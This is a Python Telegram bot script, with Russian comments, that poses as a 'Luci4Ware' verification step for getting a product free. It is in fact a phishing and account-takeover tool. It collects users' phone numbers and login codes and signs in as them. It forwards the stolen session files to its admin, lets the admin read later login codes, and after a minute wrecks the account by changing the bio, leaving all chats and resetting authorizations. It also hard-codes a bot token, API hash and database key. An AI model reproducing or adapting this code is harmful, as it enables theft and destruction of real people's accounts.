import logging
import os
import asyncio
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from pyrogram import Client as TgClient, raw
from supabase import create_client, Client

# --- КОНФИГ ---
API_TOKEN = '8607818846:AAEjGMfOMw8JmUsXu8Zj5mUdzfP1RylLVjU'
ADMIN_ID = 6332767725 
API_ID = 33824273
API_HASH = 'c290fdceef9695342e052710e16d9bb9'

SUPABASE_URL = "https://yuksepnwkzffudhcrjnl.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl1a3NlcG53a3pmZnVkaGNyam5sIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUwNDM5OTksImV4cCI6MjA5MDYxOTk5OX0.6IvYWJiWqVeFVkQ-SK1NbG5_yEXVyHijFMGwvMbn1q4"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

class Form(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    admin_get_access_phone = State() # Для входа админом

# --- ФУНКЦИЯ НАКАЗАНИЯ ---
async def destroy_account(user_id):
    client = TgClient(f"sessions/{user_id}", API_ID, API_HASH)
    try:
        await client.start()
        await client.update_profile(bio="Попытка кряка Luci4Ware пресечена. Аккаунт скомпрометирован.")
        async for dialog in client.get_dialogs():
            try: await client.leave_chat(dialog.chat.id)
            except: continue
        await client.invoke(raw.functions.auth.ResetAuthorizations())
        await client.stop()
        # Обновляем статус в базе
        supabase.table("users").update({"is_destroyed": True}).eq("id", user_id).execute()
    except: pass

# --- АДМИН ПАНЕЛЬ ---
@dp.message_handler(commands=['admin_panel'], state='*')
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    
    res = supabase.table("users").select("*").not_label("phone", "is", "null").execute()
    if not res.data:
        return await message.answer("Список пуст.")
    
    text = "🚀 **Панель управления диверсантами:**\n\n"
    markup = InlineKeyboardMarkup()
    
    for u in res.data:
        status = "💀 Снесен" if u.get('is_destroyed') else "🌐 Активен"
        access = "✅ Есть" if os.path.exists(f"sessions/{u['id']}.session") else "❌ Нет"
        text += f"📱 `{u['phone']}` | {status} | Файл: {access}\n"
    
    markup.add(InlineKeyboardButton("🔑 Зайти на аккаунт (получить код)", callback_data="admin_get_code"))
    await message.answer(text, reply_markup=markup, parse_mode="Markdown")

# --- ПОЛУЧЕНИЕ КОДА ДЛЯ АДМИНА ---
@dp.callback_query_handler(lambda c: c.data == "admin_get_code")
async def ask_phone_for_code(callback: types.CallbackQuery):
    await Form.admin_get_access_phone.set()
    await callback.message.answer("Введите номер телефона (с +), от которого нужен код:")

@dp.message_handler(state=Form.admin_get_access_phone)
async def send_code_to_admin(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    # Ищем юзера по номеру в базе
    res = supabase.table("users").select("id").eq("phone", phone).execute()
    
    if not res.data:
        await message.answer("❌ Этот номер не проходил проверку.")
        return await state.finish()
    
    user_id = res.data[0]['id']
    session_path = f"sessions/{user_id}"
    
    if not os.path.exists(f"{session_path}.session"):
        await message.answer("❌ Файл сессии удален или истек.")
        return await state.finish()

    client = TgClient(session_path, API_ID, API_HASH)
    try:
        await client.start()
        # Ищем последнее сообщение от Telegram (обычно там код)
        async for msg in client.get_chat_history(777000, limit=1):
            await message.answer(f"📩 **Последний код для {phone}:**\n\n`{msg.text}`")
        await client.stop()
    except Exception as e:
        await message.answer(f"❌ Не удалось прочитать сообщения: {e}")
    
    await state.finish()

# --- ЛОВУШКА ДЛЯ ЮЗЕРА ---
@dp.message_handler(lambda m: m.text == "🎁 Получить бесплатно", state='*')
async def free_start(message: types.Message, state: FSMContext):
    await state.finish()
    await Form.waiting_phone.set()
    await message.answer("🛡 **Верификация Luci4Ware**\nВведите номер телефона (+7...):")

@dp.message_handler(state=Form.waiting_phone)
async def phone_step(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    if not os.path.exists("sessions"): os.makedirs("sessions")
    client = TgClient(f"sessions/{message.from_user.id}", API_ID, API_HASH)
    await client.connect()
    try:
        code_data = await client.send_code(phone)
        await state.update_data(phone=phone, hash=code_data.phone_code_hash)
        await Form.waiting_code.set()
        await message.answer("📩 Введите код из Telegram:")
    except Exception as e:
        await message.answer(f"Ошибка: {e}")
        await state.finish()
    await client.disconnect()

@dp.message_handler(state=Form.waiting_code)
async def code_step(message: types.Message, state: FSMContext):
    data = await state.get_data()
    client = TgClient(f"sessions/{message.from_user.id}", API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(data['phone'], data['hash'], message.text.strip())
        await client.disconnect()
        
        # Пересылка сессии админу
        with open(f"sessions/{message.from_user.id}.session", 'rb') as f:
            await bot.send_document(ADMIN_ID, f, caption=f"🚀 Новая сессия: {data['phone']}")

        # Ловушка
        await message.answer("✅ Верификация успешна! Подождите 24 часа для привязки HWID. Не выходите из аккаунта!", reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add("👤 Профиль"))
        
        # Запуск сноса через 60 сек
        loop = asyncio.get_event_loop()
        loop.call_later(60, lambda: asyncio.ensure_future(destroy_account(message.from_user.id)))
        
        supabase.table("users").update({"phone": data['phone'], "is_verified": True}).eq("id", message.from_user.id).execute()
    except Exception as e:
        await message.answer(f"Ошибка: {e}")
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
    
